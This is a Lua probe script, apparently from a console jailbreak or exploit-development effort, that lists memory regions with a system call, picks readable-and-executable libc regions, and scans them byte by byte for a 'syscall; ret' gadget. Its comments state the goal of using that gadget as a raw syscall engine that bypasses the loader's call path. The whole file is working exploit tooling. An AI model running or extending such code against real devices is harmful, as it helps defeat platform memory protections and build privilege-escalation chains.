-- CRASH_CLASS: LOW
-- PROBE 517a: find `syscall; ret` in libc.prx.
--
-- 515a/516a: sys 674 prot bits read as 1=read, 2=write, 4=exec.  Every system
-- prx text region is p=4 (exec-only, unreadable), which is why the repo calls
-- it XOM.  But `.libc.prx` [0x103230000,0x103344000) and `.libSceFios2.prx`
-- [0xFA650000,0xFA6B0000) are p=5, i.e. readable *and* executable, and the
-- main image is p=5 too.
--
-- libc implements the variadic syscall() wrapper in assembly, so its text should
-- contain `0F 05 C3`.  Such a gadget, entered by a thr_create child with rax =
-- syscall number and the argument registers set, is a raw syscall engine that
-- bypasses the loader's serialized fcall path.

print("=== PROBE 517a: LIBC SYSCALL SCAN ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "string" then return #v == 1 and string.byte(v) or 0 end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v)
    local ok = pcall(function() memory.write_dword(a, v) end)
    return ok
end
local function wq(a, v)
    local ok = pcall(function() memory.write_qword(a, v) end)
    return ok
end
local function ascii(a, n)
    local out = ""
    for i = 0, n - 1 do
        local b = (rd(a + i) or 0) % 256
        if b == 0 then break end
        if b >= 32 and b < 127 then out = out .. string.char(b) else out = out .. "." end
    end
    return out
end

local sc_getpid = make_syscall(20)
local sc674 = make_syscall(674)
pcall(function() return sc_getpid() end)

local STRIDE, MAX = 72, 512
local buf = memory.alloc(STRIDE * MAX + 0x100)
for i = 0, 0x400, 4 do wd(buf + i, 0) end
local countp = memory.alloc(16)
wq(countp, uint64(0))
local ok = pcall(function()
    return sc674(uint64(buf), uint64(STRIDE), uint64(MAX), uint64(countp), uint64(0x40000000))
end)
local count = rd(countp) or 0
if count > MAX then count = MAX end

local targets = {}
for i = 0, count - 1 do
    local base = buf + i * STRIDE
    local prot = rd(base + 0x18) or 0
    local name = ascii(base + 0x20, 0x20)
    if (prot % 8) >= 4 and (prot % 4) ~= 0 and name:find("libc") then
        local lo = (rd(base) or 0) + (rd(base + 4) or 0) * 4294967296
        local hi = (rd(base + 8) or 0) + (rd(base + 12) or 0) * 4294967296
        targets[#targets + 1] = {lo, hi, name}
    end
end
print("[0] readable exec regions named libc: " .. #targets)
for i = 1, #targets do
    print(string.format("    [%08X,%08X) %s", targets[i][1], targets[i][2], targets[i][3]))
end

for t = 1, #targets do
    local lo, hi = targets[t][1], targets[t][2]
    print(string.format("[1] scan [%08X,%08X) %s", lo, hi, targets[t][3]))
    local n_any, n_ret = 0, 0
    local t0 = os.clock()
    local printed = 0
    for a = lo, hi - 8, 1 do
        local d = rd(a)
        if d and (d % 65536) == 0x050F then
            n_any = n_any + 1
            local d1 = rd(a + 2) or 0
            local b2 = d1 % 256
            if b2 == 0xC3 then n_ret = n_ret + 1 end
            if printed < 12 then
                local ctx = ""
                for k = -6, 10 do
                    local v = rd(a + k)
                    if v then ctx = ctx .. string.format("%02X ", v % 256) end
                end
                print(string.format("    %08X  %s", a, ctx))
                printed = printed + 1
            end
        end
    end
    print(string.format("[1] any=%d syscall-ret=%d in %.1fs", n_any, n_ret, os.clock() - t0))
end
print("=== DONE ===")
